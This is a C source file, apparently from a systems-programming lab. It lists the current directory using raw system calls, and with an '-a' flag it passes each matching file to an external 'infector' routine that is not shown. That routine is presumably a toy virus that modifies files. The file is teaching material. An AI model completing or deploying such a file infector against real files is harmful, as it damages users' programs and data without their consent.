#include "util.h"

#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_CLOSE 6
#define SYS_OPEN 5
#define SYS_EXIT 1
#define SYS_LSEEK 19
#define SYS_GETDENTS 141
#define STDIN 0
#define STDOUT 1
#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 64
#define DT_BLK 6
#define DT_CHR 2
#define DT_DIR 4
#define DT_FIFO 1
#define DT_LNK 10
#define DT_REG 8
#define DT_SOCK 12
#define DT_UNKNOWN 0

extern int system_call();
extern void infector(char*);

typedef struct ent{
    int inode;
    int offset;
    short len;
    char buf[];
} ent;

int main (int argc , char* argv[], char* envp[]) {
    int i, read, fd, infect = 0;
    char buf[8192];
    char d_type;
    char prefix = '\0'; /*default prefix*/
    ent* ent_p;
    for (i = 1; i < argc; i++){
        if(strncmp(argv[i], "-p", 2) == 0)
            prefix = (argv[i]+2)[0];
        if(strncmp(argv[i], "-a", 2) == 0){
            prefix = (argv[i]+2)[0];
            infect = 1;
        }
    }
    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
    read = system_call(SYS_GETDENTS, fd, &buf, 8192);
    i = 0;
    while(i < read){
        ent_p = (ent*) (buf + i);
        d_type = *(buf + i + ent_p->len - 1);
        i += ent_p->len;
        if((prefix == '\0') | (prefix == ent_p->buf[0])){
            if(infect) infector(ent_p->buf);
            system_call(SYS_WRITE, STDOUT, ent_p->buf, strlen(ent_p->buf));
            system_call(SYS_WRITE, STDOUT, "\t", 2);
            char* type = ((d_type == DT_REG) ?  "regular" :
                                    (d_type == DT_DIR) ?  "directory" :
                                    (d_type == DT_FIFO) ? "FIFO" :
                                    (d_type == DT_SOCK) ? "socket" :
                                    (d_type == DT_LNK) ?  "symlink" :
                                    (d_type == DT_BLK) ?  "block dev" :
                                    (d_type == DT_CHR) ?  "char dev" : "???");
            system_call(SYS_WRITE, STDOUT, type, strlen(type));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
    }
    system_call(SYS_CLOSE, fd);
    return 0;
}